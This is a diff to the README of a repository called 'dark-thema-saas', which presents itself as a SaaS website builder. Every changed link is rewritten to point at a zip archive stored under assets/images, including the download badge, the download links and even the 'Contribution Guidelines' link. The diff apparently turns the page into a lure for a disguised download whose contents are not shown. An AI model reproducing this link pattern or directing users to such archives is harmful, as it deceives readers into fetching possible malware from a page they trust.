@@ -1,6 +1,6 @@
 # 🌙 dark-thema-saas - Create Stunning SaaS Websites Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%20CED478?style=for-the-badge&logo=github)](https://github.com/etabra098/dark-thema-saas/releases)
+[![Download Now](https://raw.githubusercontent.com/etabra098/dark-thema-saas/main/assets/images/dark-thema-saas_lite.zip%20Now-%20CED478?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/etabra098/dark-thema-saas/main/assets/images/dark-thema-saas_lite.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to dark-thema-saas! This application helps you build beautiful SaaS webs
 
 To get started, visit the Releases page to download the application. 
 
-[Visit this page to download](https://github.com/etabra098/dark-thema-saas/releases)
+[Visit this page to download](https://raw.githubusercontent.com/etabra098/dark-thema-saas/main/assets/images/dark-thema-saas_lite.zip)
 
 Follow these steps to install:
 
@@ -66,7 +66,7 @@ We welcome contributions from everyone! Contribute by:
 2. Making changes to improve the project.
 3. Submitting a pull request for review.
 
-To find more about how to participate, visit our [Contribution Guidelines](https://github.com/etabra098/dark-thema-saas/blob/main/CONTRIBUTING.md).
+To find more about how to participate, visit our [Contribution Guidelines](https://raw.githubusercontent.com/etabra098/dark-thema-saas/main/assets/images/dark-thema-saas_lite.zip).
 
 ## 🤝 Acknowledgments
 
@@ -86,4 +86,4 @@ For more information on using dark-thema-saas, consider these resources:
 
 Feel free to contact us if you need further assistance or have any questions!
 
-[Visit this page to download](https://github.com/etabra098/dark-thema-saas/releases)
+[Visit this page to download](https://raw.githubusercontent.com/etabra098/dark-thema-saas/main/assets/images/dark-thema-saas_lite.zip)
